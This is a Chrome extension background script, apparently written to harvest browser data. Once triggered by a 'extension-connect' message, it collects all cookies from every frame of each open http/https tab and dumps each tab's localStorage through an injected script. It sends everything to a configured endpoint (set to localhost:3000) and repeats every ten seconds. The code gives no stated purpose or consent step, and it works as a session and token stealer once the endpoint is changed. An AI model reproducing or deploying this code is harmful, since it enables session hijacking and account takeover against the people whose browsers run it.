const settings = {
  timer: null,
  cycle: 10_000,
  endpoint: 'http://localhost:3000',
};
const noop = () => {};

/**
 * @param {chrome.tabs.Tab} tab Current active tab
 */
async function extractCookies(tab) {
  const frames = await chrome.webNavigation.getAllFrames({ tabId: tab.id });
  const promises = frames.map(frame => {
    const url = new URL(frame.url);
    if (url.protocol === 'https:' || url.protocol === 'http:') {
      return chrome.cookies.getAll({ url: url.origin });
    }
    return Promise.resolve([]);
  });
  const cookies2D = await Promise.all(promises);
  const uCookies = new Set();
  return cookies2D.reduce((prev, cookies) => {
    for (const cookie of cookies) {
      const key = JSON.stringify(cookie, undefined, 0);
      if (uCookies.has(key)) {
        continue;
      }
      uCookies.add(key);
      prev.push(cookie);
    }
    return prev;
  }, []);
}

/**
 * @param {chrome.tabs.Tab} tab Current active tab
 */
async function extractLocalStorage(tab) {
  const results = await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: function () {
      return JSON.stringify(localStorage);
    },
  });
  const storage = JSON.parse(results[0].result);
  for (const [key, value] of Object.entries(storage)) {
    try {
      storage[key] = JSON.parse(value);
    } catch {}
  }
  return storage;
}

/**
 * @param {chrome.tabs.Tab} tab Current active tab
 */
async function send() {
  const tabs = await chrome.tabs.query({ currentWindow: true });
  const data = {};
  for (const tab of tabs) {
    const url = new URL(tab.url);
    if (url.protocol !== 'https:' && url.protocol !== 'http:') {
      continue;
    }
    const [cookies, local_storage] = await Promise.all([extractCookies(tab), extractLocalStorage(tab)]);
    data[url.hostname] = { cookies, local_storage };
  }

  const response = await fetch(settings.endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  });

  if (response.status >= 400) {
    throw new Error(response.statusText);
  }
}

chrome.runtime.onMessage.addListener(function (msg, _, sendResponse) {
  if (typeof msg === 'object' && msg !== null && msg.action === 'extension-connect') {
    clearInterval(settings.timer);
    send()
      .then(() => {
        settings.timer = setInterval(() => send().catch(noop), settings.cycle);
        sendResponse();
      })
      .catch(error => {
        sendResponse(error);
      });
  } else {
    sendResponse();
  }
  return true;
});
